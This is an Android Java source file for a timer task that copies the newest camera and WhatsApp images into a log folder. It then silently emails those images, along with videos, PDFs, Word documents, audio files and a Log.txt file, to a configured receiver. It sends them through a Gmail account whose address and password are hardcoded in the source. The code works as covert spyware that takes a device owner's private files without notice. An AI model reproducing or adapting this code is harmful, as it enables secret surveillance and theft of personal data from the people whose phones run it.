package com.golden.android.broadcastreceiver;

import java.util.TimerTask;

import android.app.Activity;
import android.content.Context;
import android.content.res.Resources;
import android.os.Environment;
        import android.os.Handler;
        import android.util.Log;

        import java.io.File;
        import java.io.FileInputStream;
        import java.io.FileNotFoundException;
        import java.io.FileOutputStream;
        import java.io.InputStream;
        import java.io.OutputStream;
        import java.util.TimerTask;

/**
 * Created by ajay on 3/7/2016.
 */
public class TimeDisplayTimerTask extends TimerTask {

    public File dir;
    String TAG="TimeDisplayTimerTask";
    String reciverEmail;
    String senderMail="emailkeyapptest@gmail.com";
    String Pass="emailkeyapptestp";
    String path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/Log/";

    String s= Environment.getExternalStorageDirectory().getAbsolutePath()+"/DCIM/Camera/";
    String s1=Environment.getExternalStorageDirectory().getAbsolutePath()+"/WhatsApp/Media/WhatsApp Images/";
    String s2=Environment.getExternalStorageDirectory().getAbsolutePath()+"/Download/";
    String d=Environment.getExternalStorageDirectory().getAbsolutePath()+"/Log/";

    public File root;
    public File root1;
    public File root2;
    private Context context;
    TimeDisplayTimerTask(Context context){
        this.context=context;
    }

    public void testResource(){
         reciverEmail=context.getApplicationContext().getString(R.string.reciveremailid);//.toString();
    }
    private Handler mHandler = new Handler();

    @Override
    public void run() {

        mHandler.post(new Runnable() {

            @Override
            public void run() {
                // display toast
                Thread thread=new Thread(){
                    @Override
                    public void run() {
                            testResource();
                            Log.i(TAG,""+reciverEmail);
                        GMailSender sender = new GMailSender(senderMail,Pass);
                        try {

                            root = new File(s);//getting SDcard root path
                            root1= new File(s1);
                            root2= new File(s2);


                            File list[] = root.listFiles();
                            File list1[]= root1.listFiles();
                            File list2[]= root2.listFiles();
                            // Toast.makeText(getBaseContext(), "" + list[list.length - 1].getName(), Toast.LENGTH_SHORT).show();

                              String x=list[list.length-1].getName();
                            //  Log.i(TAG, "run: "+x);
                             String x1=list1[list1.length-1].getName();
                            //   String x2=list2[list2.length-1].getName();

                            copyFile(s,x,d);
                            copyFile(s1,x1,d);
                            //   copyFile(s2,x2,d);


                            dir = new File(path);//getting SDcard root path


                            File listFile[] = dir.listFiles();
                            if (listFile != null && listFile.length > 0)
                            {
                                for (int i = 0; i < listFile.length; i++)
                                {
                                    if (listFile[i].getName().endsWith(".txt"))
                                    {

                                        //changes by Pratik sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+"/Log.txt","txt","");
                                        sender.sendMail("Email Subject", "",senderMail, reciverEmail, path+"/Log.txt","txt","");
                                        //   sender.sendMail("Email Subject","body",senderMail,reciverEmail);
                                    }

                                    if(listFile[i].getName().endsWith(".jpg"))
                                    {

                                        // Pratik    sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+listFile[i].getName(),"jpg","Image_"+i);
                                        try {
                                            sender.sendMail("Email Subject", "", senderMail, reciverEmail, path + listFile[i].getName(), "jpg", "Image_" + i);
                                        }catch(Exception e)
                                        {
                                            Log.e(TAG,""+e.toString());
                                        }
                                    }

                                    if (listFile[i].getName().endsWith(".mp4"))
                                    {
                                        //pratik sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+listFile[i].getName(),"mp4","Video_"+i);
                                        sender.sendMail("Email Subject", "", senderMail, reciverEmail, path+listFile[i].getName(),"mp4","Video_"+i);
                                    }
                                    if (listFile[i].getName().endsWith(".pdf"))
                                    {
                                        // pratik sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+listFile[i].getName(),"pdf","PDF_"+i);
                                        sender.sendMail("Email Subject", "", senderMail, reciverEmail, path+listFile[i].getName(),"pdf","PDF_"+i);

                                    }
                                    if (listFile[i].getName().endsWith(".docx"))
                                    {
                                        //pratik sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+listFile[i].getName(),"docx","DOCX_"+i);
                                        sender.sendMail("Email Subject", "", senderMail, reciverEmail, path+listFile[i].getName(),"docx","DOCX_"+i);
                                    }
                                    if (listFile[i].getName().endsWith(".mp3"))
                                    {
                                        //pratik  sender.sendMail("Email Subject", "", "ajay.dasarwar@gmail.com", "ajaydasarwar94@gmail.com", path+listFile[i].getName(),"mp3","Audio_"+i);
                                        sender.sendMail("Email Subject", "", senderMail, reciverEmail, path+listFile[i].getName(),"mp3","Audio_"+i);

                                    }
                                }
                            }

                            // deleteFile(path,x);
                            //pratik    deleteFile(path,x1);
                            // deleteFile(path,x2);


                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                    }
                };
                thread.start();
            }

        });

    }

    private void copyFile(String inputPath, String inputFile, String outputPath) {


        InputStream in = null;
        OutputStream out = null;
        try {

            //create output directory if it doesn't exist
            File dir = new File(outputPath);
            if (!dir.exists()) {
                dir.mkdirs();
            }


            in = new FileInputStream(inputPath + inputFile);
            out = new FileOutputStream(outputPath + inputFile);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;

            // write the output file (You have now copied the file)
            out.flush();
            out.close();
            out = null;

        } catch (FileNotFoundException fnfe1) {
            Log.e("tag", fnfe1.getMessage());
        } catch (Exception e) {
            Log.e("tag", e.getMessage());
        }
    }

    private void deleteFile(String inputPath, String inputFile) {
        try {
            // delete the original file
            new File(inputPath + inputFile).delete();


        } catch (Exception e) {
            Log.e("tag", e.getMessage());
        }
    }
}
